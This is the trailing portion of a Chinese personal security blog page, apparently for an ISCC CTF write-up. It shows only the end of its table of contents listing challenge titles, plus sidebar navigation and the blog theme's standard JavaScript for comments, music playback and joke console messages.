class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E6%9D%A5%E5%90%A7%E6%B0%B8%E8%BF%9C%E7%9A%84%E7%A5%9E"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">回来吧永远的神</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%A2%98%E6%88%91%E5%87%BA%E4%B8%8D%E4%BA%86%E4%BA%86"><span class="toc-number">1.3.1.6.</span> <span class="toc-text">这题我出不了了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8E%E6%97%B6%E4%BF%B1%E8%BF%9B"><span class="toc-number">1.3.1.7.</span> <span class="toc-text">与时俱进</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%89%E8%BF%9B%E9%98%BF%E5%B8%95%E5%A5%87%E5%B7%A5%E8%B5%84"><span class="toc-number">1.3.1.8.</span> <span class="toc-text">掉进阿帕奇工资</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E6%99%AE%E9%80%9A%E7%9A%84XSS%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.1.9.</span> <span class="toc-text">一道普通的XSS题目</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E9%A2%98-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">擂台题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%8A%E7%8B%82%E9%A3%99%E3%80%8B%E7%9F%A5%E5%A4%9A%E5%B0%91"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">《狂飙》知多少</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B8%80%E9%9B%86"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">最喜欢的一集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mobile"><span class="toc-number">1.4.</span> <span class="toc-text">mobile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">练武题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Puzzle-Game"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">Puzzle_Game</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ChallengeMobile"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">ChallengeMobile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ohHELP"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">ohHELP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E9%A2%98-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">擂台题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E6%98%A5%E5%B1%B1"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">上春山</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EzArd"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">EzArd</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.5.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">练武题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#chaos"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">chaos</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ISCC-easy"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">ISCC_easy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easyshell"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">easyshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#miao"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">miao</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Your-program"><span class="toc-number">1.5.1.6.</span> <span class="toc-text">Your_program</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ISCC-U"><span class="toc-number">1.5.1.7.</span> <span class="toc-text">ISCC_U</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#eazy-heap"><span class="toc-number">1.5.1.8.</span> <span class="toc-text">eazy_heap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#heapheap"><span class="toc-number">1.5.1.9.</span> <span class="toc-text">heapheap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shopping"><span class="toc-number">1.5.1.10.</span> <span class="toc-text">shopping</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E9%A2%98-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">擂台题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Curious"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">Curious</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unheap"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">unheap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#great"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">great</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyheap"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">babyheap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text">实战题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%80"><span class="toc-number">1.6.1.</span> <span class="toc-text">阶段一</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/25/ISCC-wp/" title="ISCC-wp">ISCC-wp</a><time datetime="2024-05-25T14:54:33.000Z" title="发表于 2024-05-25 22:54:33">2024-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS/" title="java反序列化--URLDNS">java反序列化--URLDNS</a><time datetime="2024-05-23T08:49:53.000Z" title="发表于 2024-05-23 16:49:53">2024-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%BD%AE/" title="java反序列化前置">java反序列化前置</a><time datetime="2024-05-23T08:47:23.000Z" title="发表于 2024-05-23 16:47:23">2024-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/23/java-RMI/" title="java-RMI">java-RMI</a><time datetime="2024-05-23T08:42:28.000Z" title="发表于 2024-05-23 16:42:28">2024-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/23/H&amp;NCTF-wp/" title="h_nCTF-wp">h_nCTF-wp</a><time datetime="2024-05-23T08:39:24.000Z" title="发表于 2024-05-23 16:39:24">2024-05-23</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>4</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>4</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>4</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>